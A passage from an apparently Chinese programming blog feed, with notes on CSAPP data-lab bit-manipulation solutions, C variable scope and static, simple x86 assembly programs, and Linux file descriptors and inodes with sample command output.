bits，然后减去1010，通过右移31位得到符号位从而判断正负。如果是负数那么说明小于0b00111010，右移31位之后得到的符号位是1；如果是等于或者大于符号位是0<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span><br><span class="hljs-comment"> *   Example: isAsciiDigit(0x35) = 1.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x3a) = 0.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x05) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//0x30:0011 0000  </span><br><span class="hljs-comment">//0x3a:0011 1010 </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isAsciiDigit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> a=!((x&gt;&gt;<span class="hljs-number">4</span>)^<span class="hljs-number">3</span>);<span class="hljs-comment">//must be 0011</span><br>  <span class="hljs-keyword">int</span> b=(x&amp;<span class="hljs-number">0xf</span>)+(~<span class="hljs-number">0xa</span>+<span class="hljs-number">1</span>);<span class="hljs-comment">//get the first 4 bits and minus 0b1010</span><br>  <span class="hljs-keyword">int</span> c=b&gt;&gt;<span class="hljs-number">31</span>;<span class="hljs-comment">//get the last 1 bit is 0 or 1</span><br>  <span class="hljs-keyword">return</span> a&amp;(!!c);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h1></li><li>实现异或操作（x?y:z）</li><li>如果x是1，那么返回y的值，如果x是0，返回z的值</li><li>返回(x&amp;y)|(~x&amp;z)即可（x=！！x是为了得到x是0还是1）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * conditional - same as x ? y : z </span><br><span class="hljs-comment"> *   Example: conditional(2,4,5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 16</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">conditional</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y, <span class="hljs-keyword">int</span> z)</span> </span>&#123;<br>  x=!!x;<span class="hljs-comment">//convert x to 0/1</span><br>  x=~x+<span class="hljs-number">1</span>;<span class="hljs-comment">//convert x to complement  0 to 0(0000000...00) ; 1 to -1(1111111....11111)</span><br>  <span class="hljs-keyword">return</span> (x&amp;y)|(~x&amp;z);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h1><ul><li>测试是否满足x&lt;=y</li><li>有以下情况：<ul><li>x等于y，此时异或得到0</li><li><code>x&lt;y</code><ul><li>如果x符号位为0y为1那么不满足x&lt;=y</li><li>如果x符号位为1y为0那么满足x&lt;=y</li><li>如果x符号位和y的符号位相同，那么：<ul><li>将x减去y，判断结果的正负。在这里为了防止负数减去负数而溢出，使用x+（-y）的形式</li></ul></li></ul></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// 1:x==y 2:x is neg y is pos 3:x is pos and y is pos </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> equal=!(x^y);<br>  <span class="hljs-keyword">int</span> x_flag=!!(x&gt;&gt;<span class="hljs-number">31</span>);<br>  <span class="hljs-keyword">int</span> y_flag=!!(y&gt;&gt;<span class="hljs-number">31</span>);<br>  <span class="hljs-keyword">int</span> minus=x+~y+<span class="hljs-number">1</span>;<span class="hljs-comment">//x-y</span><br>  <span class="hljs-keyword">int</span> minus_flag=!!(minus&gt;&gt;<span class="hljs-number">31</span>);<br>  <span class="hljs-keyword">int</span> not_same=!(x_flag^y_flag);<br>  <span class="hljs-keyword">return</span> equal | (x_flag&amp;!y_flag) | (not_same&amp;minus_flag);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h1><ul><li>只有当x是0的时候返回1，x为负数或正数都返回0</li><li>思路：<ul><li>当x是0或者最小的负数的情况下，(x^(~x+1))&gt;&gt;31才为0b00…000，其余情况下皆为0b111111…1111，使用这个性质将范围缩小到0或者最小的负数</li><li>在满足上面的前提下，排除掉最小负数的情况，即可得到答案</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * logicalNeg - implement the ! operator, using all of </span><br><span class="hljs-comment"> *              the legal operators except !</span><br><span class="hljs-comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 4 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">logicalNeg</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> y=x^(~x+<span class="hljs-number">1</span>);<span class="hljs-comment">//only if x=000...0000 or x=1000...0000 y=0</span><br>  y=(y&gt;&gt;<span class="hljs-number">31</span>)+<span class="hljs-number">1</span>;<span class="hljs-comment">//get the sign</span><br>  <span class="hljs-keyword">return</span> y&amp;((x&gt;&gt;<span class="hljs-number">31</span>)+<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="howManybits"><a href="#howManybits" class="headerlink" title="howManybits"></a>howManybits</h1><ul><li>题意：使用最少几位补码可以表示一个数字？比如传入一个int类型的x，值为-5，那么它的补码应该是11111111111111111111111111111011，因此最少使用四个bits可以表示也即是1011，1表示符号位。</li><li>思路：<ul><li>可以将负数的情况转化为整数的情况。将负数取反，最终结果不变</li><li>找到第一个1出现的位置，然后+1即可。比如howManyBits(12)=howManyBits(01100),1第一次出现在从右往左第四位，加一即使5，也就是最少的可以表示的补码的位数<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* howManyBits - return the minimum number of bits required to represent x in</span><br><span class="hljs-comment"> *             two&#x27;s complement</span><br><span class="hljs-comment"> *  Examples: howManyBits(12) = 5           01100</span><br><span class="hljs-comment"> *            howManyBits(298) = 10         </span><br><span class="hljs-comment"> *            howManyBits(-5) = 4 </span><br><span class="hljs-comment"> *            howManyBits(0)  = 1</span><br><span class="hljs-comment"> *            howManyBits(-1) = 1</span><br><span class="hljs-comment"> *            howManyBits(0x80000000) = 32</span><br><span class="hljs-comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *  Max ops: 90</span><br><span class="hljs-comment"> *  Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">howManyBits</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> b16,b8,b4,b2,b1,b0;<br>  <span class="hljs-keyword">int</span> musk=x&gt;&gt;<span class="hljs-number">31</span>;<span class="hljs-comment">//musk is all 1 or all 0</span><br>  x=(~musk&amp;x)|(musk&amp;~x);<span class="hljs-comment">//if x is negative ，turn x into ~x</span><br> <br>  b16=!!(x&gt;&gt;<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">4</span>;<span class="hljs-comment">//get the last 16 bits&#x27; sign ,and &lt;&lt; 4 turn x into 16 or 0,so if x is 16 means in the last 16 bits there is at least 1</span><br>  x=x&gt;&gt;b16;<span class="hljs-comment">//x&gt;&gt;16 or x&gt;&gt;0</span><br>  b8=!!(x&gt;&gt;<span class="hljs-number">8</span>)&lt;&lt;<span class="hljs-number">3</span>;<br>  x=x&gt;&gt;b8;<br>  b4=!!(x&gt;&gt;<span class="hljs-number">4</span>)&lt;&lt;<span class="hljs-number">2</span>;<br>  x=x&gt;&gt;b4;<br>  b2=!!(x&gt;&gt;<span class="hljs-number">2</span>)&lt;&lt;<span class="hljs-number">1</span>;<br>  x=x&gt;&gt;b2;<br>  b1=!!(x&gt;&gt;<span class="hljs-number">1</span>);<br>  x=x&gt;&gt;b1;<br>  b0=!!x;<br>  <span class="hljs-keyword">return</span> b16+b8+b4+b2+b1+b0+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><p>浮点数部分</p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>C语言：作用域规则</title>
    <link href="/p/b163e116/"/>
    <url>/p/b163e116/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/cpro.png"></p><h1 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h1><ul><li>在整个程序生命周期内都是有效的</li><li>在任意的函数内部能访问全局变量</li><li>系统会自动对全局变量初始化</li><li>保存在内存的全局存储区中，占用静态的存储单元</li></ul><table><thead><tr><th>数据类型</th><th>初始化默认值</th></tr></thead><tbody><tr><td>int</td><td>0</td></tr><tr><td>char</td><td>‘\0’</td></tr><tr><td>float</td><td>0</td></tr><tr><td>double</td><td>0</td></tr><tr><td>pointer</td><td>NULL</td></tr></tbody></table><h1 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h1><ul><li>在某个函数或块的内部声明的变量</li><li>只能被该函数或该代码块内部的语句使用</li><li>保存在栈中</li></ul><h1 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h1><ul><li>名字的作用域指的是程序中可以使用该名字的部分</li><li>变量或函数的作用域从声明它的地方开始，到其所在的（待编译的）文件的末尾结束</li><li>一个程序具有多个文件，一个变量只能在某个文件中定义一次，而其他文件可以通过extern声明来访问它</li></ul><p>file1：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> sp;<br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">double</span> val[];<span class="hljs-comment">//注意这里</span><br></code></pre></td></tr></table></figure><p>file2:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> sp = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">double</span> val[MAXVAL];<br></code></pre></td></tr></table></figure><p>这样的话，sp和val可以在file1中使用</p><h1 id="static关键字"><a href="#static关键字" class="headerlink" title="static关键字"></a>static关键字</h1><ul><li>用 static声明限定外部变量与函数，可以将其后声明的对象的作用域限定为被编译源文件的剩余部分</li><li>static 类型的内部变量是一种只能在某个特定函数中使用但一直占据存储空间的变量</li></ul><p>在不进行显式初始化的情况下，外部变量和静态变量都将被初始化为 0，而自动变量和寄存器变量的初值则没有定义（即初值为无用的信息）</p>]]></content>
    
    
    <categories>
      
      <category>C语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编语言：简单示例程序讲解</title>
    <link href="/p/2fa8408d/"/>
    <url>/p/2fa8408d/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/assembly1.jpeg"></p><h1 id="最简单的汇编程序"><a href="#最简单的汇编程序" class="headerlink" title="最简单的汇编程序"></a>最简单的汇编程序</h1><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl">.section .data<br>.section .text<br>.globl _start<br>_start:<br>movl $1, %eax <span class="hljs-comment"># this is the linux kernel command</span><br><span class="hljs-comment"># number (system call) for exiting</span><br><span class="hljs-comment"># a program</span><br>movl $4, %ebx <span class="hljs-comment"># this is the status number we will</span><br><span class="hljs-comment"># return to the operating system.</span><br><span class="hljs-comment"># Change this around and it will</span><br><span class="hljs-comment"># return different things to</span><br><span class="hljs-comment"># echo $?</span><br><span class="hljs-keyword">int</span> $0x8<span class="hljs-number">0</span> <span class="hljs-comment"># this wakes up the kernel to run</span><br><span class="hljs-comment"># the exit command</span><br></code></pre></td></tr></table></figure><ul><li>编写完成后，通过as指令汇编为.o文件，然后通过ld指令链接为可执行文件</li><li>该汇编程序的本质：<ul><li>将退出状态设置为4</li><li>shell中使用$?得到退出的状态码可以检测退出状态</li></ul></li><li>#表示注释</li><li><code>.</code>开头的表示伪指令<ul><li><code>.data</code>段保存程序的数据，是可读可写的，C程序的全局变量也属于.data段。本程序中没有定义数据，所以.data段是空的。</li><li><code>.text</code>段保存代码，是<strong>只读和可执行</strong>的</li></ul></li><li>符号（Symbol）<ul><li><strong>符号在汇编程序中代表一个地址</strong>。汇编程序经过汇编器的处理之后，所有的符号都被替换成它所代表的地址值</li><li>变量名和函数名都是符号，本质上是代表内存地址的<ul><li>通过变量名访问一个变量，本质是读写某个地址的内存单元</li><li>通过函数名调用一个函数，其实就是跳转到该函数第一条指令所在的地址</li></ul></li></ul></li><li>_start<ul><li>是一个地址，整个程序的入口</li><li>.globl指示告诉汇编器，_start这个符号要被链接器用到</li></ul></li><li>int指令称为软中断指令，可以用这条指令故意产生一个异常，从而从用户态下陷到内核态<ul><li>int指令中的立即数0x80是一个参数，触发系统调用</li><li>eax和ebx寄存器的值是传递给系统调用的两个参数<ul><li>eax的值是系统调用号，1对应_exit系统调用</li><li>ebx的值是传给_exit系统调用的参数，也就是退出状态</li></ul></li></ul></li></ul><h1 id="求一组数的最大值"><a href="#求一组数的最大值" class="headerlink" title="求一组数的最大值"></a>求一组数的最大值</h1><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs perl">.section .data<br>data_items:<br>    .long <span class="hljs-number">3</span>,<span class="hljs-number">67</span>,<span class="hljs-number">34</span>,<span class="hljs-number">222</span>,<span class="hljs-number">45</span>,<span class="hljs-number">75</span>,<span class="hljs-number">54</span>,<span class="hljs-number">34</span>,<span class="hljs-number">44</span>,<span class="hljs-number">33</span>,<span class="hljs-number">22</span>,<span class="hljs-number">11</span>,<span class="hljs-number">66</span>,<span class="hljs-number">0</span> <span class="hljs-comment"># </span><br>.section .text<br>.global _start<br><br>_start:<br>    movl $0,%edi<br>    movl data_items(,%edi,<span class="hljs-number">4</span>), %eax<br>    movl %eax,%ebx<br><br>start_loop:<br>    cmpl $0,%eax<br>    je loop_exit<br>    incl %edi<br>    movl data_items(,%edi,<span class="hljs-number">4</span>),%eax <span class="hljs-comment">#将当前数组的数字放到eax总</span><br>    cmpl %ebx,%eax<span class="hljs-comment">#比较ebx和eax储存的数字的大小</span><br>    jle start_loop<span class="hljs-comment">#如果ebx更大那么直接下一次循环</span><br>    movl %eax,%ebx<span class="hljs-comment">#如果eax更大那么把eax中数字放到ebx中</span><br>    jmp start_loop<br><br>loop_exit:<br>    mov $1,%eax<br>    <span class="hljs-keyword">int</span> $0x8<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><ul><li>data_items是数组的首地址</li><li>edi的值是数组的下标</li><li>4表示数组的每个元素占4字节,数组中第edi个元素的地址是<code>data_items + edi * 4</code></li><li>ebx寄存器保存到目前为止找到的最大值</li><li>eax寄存器保存当前要比较的数</li></ul>]]></content>
    
    
    <categories>
      
      <category>汇编语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux文件描述符与inode的关系</title>
    <link href="/p/f1bb17a0/"/>
    <url>/p/f1bb17a0/</url>
    
    <content type="html"><![CDATA[<h1 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h1><p>Linux中，文件描述符（File descriptor，fd），是表示指向文件的引用的抽象化概念，在形式上是一个非负整数，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符</p><p>下面open系统调用返回一个文件描述符给fd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">fd = open(pathname, flags, mode)<br></code></pre></td></tr></table></figure><p>常见的几个文件描述符：</p><ul><li><p>STDIN，文件描述符：0；标准输入，默认从键盘读取信息；</p></li><li><p>STDOUT，文件描述符：1；标准输出，默认将输出结果输出至终端；</p></li><li><p>STDERR，文件描述符：2；标准错误，默认将输出结果输出至终端</p></li></ul><h1 id="向标准输出中写入字符串"><a href="#向标准输出中写入字符串" class="headerlink" title="向标准输出中写入字符串"></a>向标准输出中写入字符串</h1><p>标准输出的文件描述符为1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *msg = <span class="hljs-string">&quot;Hello, world!\n&quot;</span>;<br>    syscall(SYS_write, <span class="hljs-number">1</span>, msg, <span class="hljs-built_in">strlen</span>(msg));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash">  ./a.out</span><br>Hello, world!<br></code></pre></td></tr></table></figure><h1 id="inode"><a href="#inode" class="headerlink" title="inode"></a>inode</h1><p>inode是用来存储文件<strong>元数据</strong>的，<code>stat</code>命令可以输出一个文件的元信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">stat C<br>  File: C<br>  Size: <span class="hljs-number">4096</span>            Blocks: <span class="hljs-number">8</span>          IO Block: <span class="hljs-number">4096</span>   directory<br>Device: <span class="hljs-number">801</span>h/<span class="hljs-number">2049</span>d      Inode: <span class="hljs-number">786444</span>      Links: <span class="hljs-number">2</span><br>Access: (<span class="hljs-number">0775</span>/drwxrwxr-x)  Uid: ( <span class="hljs-number">1000</span>/ zaralts)   Gid: ( <span class="hljs-number">1000</span>/ zaralts)<br>Access: <span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-09</span> <span class="hljs-number">16</span>:<span class="hljs-number">44</span>:<span class="hljs-number">06.279746438</span> +<span class="hljs-number">0800</span><br>Modify: <span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span> <span class="hljs-number">22</span>:<span class="hljs-number">51</span>:<span class="hljs-number">11.594725534</span> +<span class="hljs-number">0800</span><br>Change: <span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span> <span class="hljs-number">22</span>:<span class="hljs-number">51</span>:<span class="hljs-number">11.594725534</span> +<span class="hljs-number">0800</span><br> Birth: -<br></code></pre></td></tr></table></figure><p><code>df -i </code>命令查看每个硬盘分区的inode总数和已经使用的数量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"> df -i<br>Filesystem      Inodes  IUsed   IFree IUse% Mounted on<br>udev            <span class="hljs-number">493942</span>    <span class="hljs-number">484</span>  <span class="hljs-number">493458</span>    <span class="hljs-number">1</span>% /dev<br>tmpfs           <span class="hljs-number">500214</span>   <span class="hljs-number">1088</span>  <span class="hljs-number">499126</span>    <span class="hljs-number">1</span>% /run<br>/dev/sda1      <span class="hljs-number">2621440</span> <span class="hljs-number">227759</span> <span class="hljs-number">2393681</span>    <span class="hljs-number">9</span>% /<br>tmpfs           <span class="hljs-number">500214</span>      <span class="hljs-number">1</span>  <span class="hljs-number">500213</span>    <span class="hljs-number">1</span>% /dev/shm<br>tmpfs           <span class="hljs-number">500214</span>      <span class="hljs-number">5</span>  <span class="hljs-number">500209</span>    <span class="hljs-number">1</span>% /run/lock<br>tmpfs           <span class="hljs-number">500214</span>     <span class="hljs-number">18</span>  <span class="hljs-number">500196</span>    <span class="hljs-number">1</span>% /sys/fs/cgroup<br>tmpfs           <span class="hljs-number">500214</span>     <span class="hljs-number">25</span>  <span class="hljs-number">500189</span>    <span class="hljs-number">1</span>% /run/user/<span class="hljs-number">121</span><br>tmpfs           <span class="hljs-number">500214</span>     <span class="hljs-number">49</span>  <span class="hljs-number">500165</span>    <span class="hljs-number">1</span>% /run/user/<span class="hljs-number">1000</span><br></code></pre></td></tr></table></figure><p><code>ll -i</code>可以列出当前目录所有的包括inode号的文件信息</p><p>inode号是在第一列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">ll -i<br><span class="hljs-number">528761</span> drwxr-xr-x <span class="hljs-number">22</span> zaralts zaralts  <span class="hljs-number">4096</span> <span class="hljs-number">4</span>月   <span class="hljs-number">8</span> <span class="hljs-number">21</span>:<span class="hljs-number">17</span> ./<br><span class="hljs-number">524289</span> drwxr-xr-x  <span class="hljs-number">3</span> root    root     <span class="hljs-number">4096</span> <span class="hljs-number">4</span>月   <span class="hljs-number">2</span> <span class="hljs-number">16</span>:<span class="hljs-number">31</span> ../<br><span class="hljs-number">524792</span> -rw-------  <span class="hljs-number">1</span> zaralts zaralts  <span class="hljs-number">5848</span> <span class="hljs-number">4</span>月   <span class="hljs-number">8</span> <span class="hljs-number">15</span>:<span class="hljs-number">36</span> .bash_history<br><span class="hljs-number">528764</span> -rw-r--r--  <span class="hljs-number">1</span> zaralts zaralts   <span class="hljs-number">220</span> <span class="hljs-number">4</span>月   <span class="hljs-number">2</span> <span class="hljs-number">16</span>:<span class="hljs-number">31</span> .bash_logout<br><span class="hljs-number">528762</span> -rw-r--r--  <span class="hljs-number">1</span> zaralts zaralts  <span class="hljs-number">3771</span> <span class="hljs-number">4</span>月   <span class="hljs-number">2</span> <span class="hljs-number">16</span>:<span class="hljs-number">31</span> .bashrc<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a7b17995b8c14f1bb7a11f7070713ab5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></p><ul><li>每个进程都会有文件描述符表，该表的每一条都记录了单个文件描述符的相关信息</li><li>内核对所有打开的文件维护有一个系统级的描述表格（open file description table），表中各条目称为打开文件句柄（open file handle），一个打开文件句柄存储了与一个打开文件相关的全部信息，比如当前文件偏移量、对该文件 i-node 对象的引用等</li></ul><h1 id="proc-pid-fd"><a href="#proc-pid-fd" class="headerlink" title="/proc/pid/fd"></a>/proc/pid/fd</h1><p>该文件夹包含了某一进程所占用的文件描述符<br>下图中socket：后面显示的是对应的inode号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">/proc/<span class="hljs-number">92044</span>/fd$ ll<br>total <span class="hljs-number">0</span><br>dr-x------ <span class="hljs-number">2</span> zaralts zaralts  <span class="hljs-number">0</span> <span class="hljs-number">4</span>月   <span class="hljs-number">9</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> ./<br>dr-xr-xr-x <span class="hljs-number">9</span> zaralts zaralts  <span class="hljs-number">0</span> <span class="hljs-number">4</span>月   <span class="hljs-number">9</span> <span class="hljs-number">21</span>:<span class="hljs-number">17</span> ../<br>lr-x------ <span class="hljs-number">1</span> zaralts zaralts <span class="hljs-number">64</span> <span class="hljs-number">4</span>月   <span class="hljs-number">9</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> <span class="hljs-number">0</span> -&gt; /dev/null<br>lrwx------ <span class="hljs-number">1</span> zaralts zaralts <span class="hljs-number">64</span> <span class="hljs-number">4</span>月   <span class="hljs-number">9</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> <span class="hljs-number">1</span> -&gt; <span class="hljs-string">&#x27;socket:[39859]&#x27;</span><br>lrwx------ <span class="hljs-number">1</span> zaralts zaralts <span class="hljs-number">64</span> <span class="hljs-number">4</span>月   <span class="hljs-number">9</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> <span 